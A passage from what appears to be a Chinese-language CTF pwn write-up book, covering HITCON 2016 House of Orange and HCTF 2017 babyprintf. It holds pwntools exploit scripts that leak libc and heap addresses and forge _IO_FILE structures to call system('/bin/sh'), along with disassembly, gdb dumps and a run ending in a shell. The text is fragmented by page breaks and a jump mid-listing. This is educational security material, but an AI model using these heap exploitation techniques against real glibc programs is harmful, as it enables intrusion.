libc_base = u64(see()) - 0x3c4188 # fd pointer
log.info("libc_base address: 0x%x" % libc_base)
def leak_heap():
global heap_addr
upgrade(0x10, 'A' * 15)
heap_addr = u64(see()) - 0xc0 # fd_nextsize pointer
log.info("heap address: 0x%x" % heap_addr)
def house_of_orange():
io_list_all = libc_base + libc.symbols['_IO_list_all']
system_addr = libc_base + libc.symbols['system']
1353
6.1.24 pwn HITCONCTF2016 House_of_Orange
vtable_addr = heap_addr + 0x5c8
log.info("_IO_list_all address: 0x%x" % io_list_all)
log.info("system address: 0x%x" % system_addr)
log.info("vtable address: 0x%x" % vtable_addr)
stream = "/bin/sh\x00" + p64(0x61) # fake header
# fp
stream += p64(0) + p64(io_list_all - 0x10) # fake bk pointer
stream = stream.ljust(0xa0, '\x00')
stream += p64(heap_addr + 0x5b8) # fp->_wide_data
stream = stream.ljust(0xc0, '\x00')
stream += p64(1) # fp->_mode
payload = "A" * 0x420
payload += stream
payload += p64(0) * 2
payload += p64(vtable_addr) # _IO_FILE_plus->vta
ble
payload += p64(1) # fp->_wide_data->_I
O_write_base
payload += p64(2) # fp->_wide_data->_I
O_write_ptr
payload += p64(system_addr) # vtable __overflow
upgrade(0x600, payload)
def pwn():
io.sendlineafter("Your choice : ", '1') # abort routine
io.interactive()
if __name__ == '__main__':
overwrite_top()
leak_libc()
leak_heap()
house_of_orange()
pwn()
1354
6.1.24 pwn HITCONCTF2016 House_of_Orange
参考资料
https://ctftime.org/task/4811
1355
6.1.25 pwn HCTF2017 babyprintf
6.1.25 pwn HCTF2017 babyprintf
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file babyprintf
babyprintf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, fo
r GNU/Linux 2.6.32, BuildID[sha1]=5652f65b98094d8ab456eb0a54d37d
9b09b4f3f6, stripped
$ checksec -f babyprintf
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 1 2 babyprin
tf
$ strings libc-2.24.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.24-9ubuntu2.2) stable release vers
ion 2.24, by Roland McGrath et al.
Compiled by GNU CC version 6.3.0 20170406.
64 位程序，开启了 canary 和 NX，默认开启 ASLR。
在 Ubuntu16.10 上玩一下：
1356
6.1.25 pwn HCTF2017 babyprintf
./babyprintf
size: 0
string: AAAA
result: AAAAsize: 10
string: %p.%p.%p.%p
result: 0x7ffff7dd4720.(nil).0x7ffff7fb7500.0x7ffff7dd4720size:
-1
too long
真是个神奇的 "printf" 实现。首先 size 的值对 string 的输入似乎并没有什么影响；
然后似乎是直接打印 string，而没有考虑格式化字符串的问题；最后程序应该是对
size 做了大小上的检查，而且是无符号数。
题目解析
main
[0x00400850]> pdf @ main
;-- section..text:
/ (fcn) main 130
| main ();
| ; DATA XREF from 0x0040086d (entry0)
| 0x004007c0 push rbx
; [14] -r-x section size 706 named .text
| 0x004007c1 xor eax, eax
| 0x004007c3 call sub.setbuf_950
; void setbuf(FILE *stream,
| ,= 0x004007d0 mov edi, eax
| :| 0x004007d2 call sym.imp.malloc
; rax = malloc(size) 分配堆空间
| :| 0x004007d7 mov esi, str.string:
; 0x400aa4 ; "string: "
| :| 0x004007dc mov rbx, rax
| :| 0x004007df mov edi, 1
1357
6.1.25 pwn HCTF2017 babyprintf
| :| 0x004007e4 xor eax, eax
| :| 0x004007e6 call sym.imp.__printf_chk
| :| 0x004007eb mov rdi, rbx
; rdi = rbx == rax
| :| 0x004007ee xor eax, eax
| :| 0x004007f0 call sym.imp.gets
; 调用 gets 读入字符串
| :| 0x004007f5 mov esi, str.result:
; 0x400aad ; "result: "
| :| 0x004007fa mov edi, 1
| :| 0x004007ff xor eax, eax
| :| 0x00400801 call sym.imp.__printf_chk
| :| 0x00400806 mov rsi, rbx
; rsi = rbx == rax
| :| 0x00400809 mov edi, 1
| :| 0x0040080e xor eax, eax
| :| 0x00400810 call sym.imp.__printf_chk
; 调用 __printf_chk 打印字符串
| :| ; CODE XREF from 0x004007c8 (main)
| :`-> 0x00400815 mov esi, str.size:
; 0x400a94 ; "size: "
| : 0x0040081a mov edi, 1
| : 0x0040081f xor eax, eax
| : 0x00400821 call sym.imp.__printf_chk
| : 0x00400826 xor eax, eax
| : 0x00400828 call sub._IO_getc_990
; 读入 size
| : 0x0040082d cmp eax, 0x1000
| `==_IO_write_
base
stream += p64(0xffffffff) # fp->_IO_write_
ptr
stream += p64(0) *2 # fp->_IO_write_
end, fp->_IO_buf_base
stream += p64((bin_sh_addr - 100) / 2) # fp->_IO_buf_end
stream = stream.ljust(0xc0, '\x00')
stream += p64(0) # fp->_mode
payload = "A" * 0x10
payload += stream
payload += p64(0) * 2
payload += p64(vtable_addr) # _IO_FILE_plus-
>vtable
payload += p64(system_addr)
prf(0x10, payload)
改进版的 house-of-orange，详细你已经看了参考章节，这里就不再重复了，内存
布局如下：
1361
6.1.25 pwn HCTF2017 babyprintf
gdb-peda$ x/40gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000021
0x602010: 0x4141414141414141 0x4141414141414141
0x602020: 0x0000000000000000 0x0000000000000021
0x602030: 0x4141414141414141 0x4141414141414141
0x602040: 0x0000000000000000 0x0000000000000061  __libc_message -> __GI_abort ->
_IO_flush_all_lockp -> __GI__IO_str_overflow ，获得 shell。
1362
6.1.25 pwn HCTF2017 babyprintf
开启 ASLR，Bingo!!!
$ python exp.py
[+] Starting local process './babyprintf': pid 8307
[*] libc_base address: 0x7f40dc2ca000
[*] _IO_list_all address: 0x7f40dc68c500
[*] system address: 0x7f40dc30f6a0
[*] /bin/sh address: 0x7f40dc454c40
[*] vtable address: 0x7f40dc6884c0
[*] Switching to interactive mode
result: AAAAAAAAAAAAAAAAsize: *** Error in `./babyprintf': mallo
c(): memory corruption: 0x00007f40dc68c500 ***
======= Backtrace: =========
...
$ whoami
firmy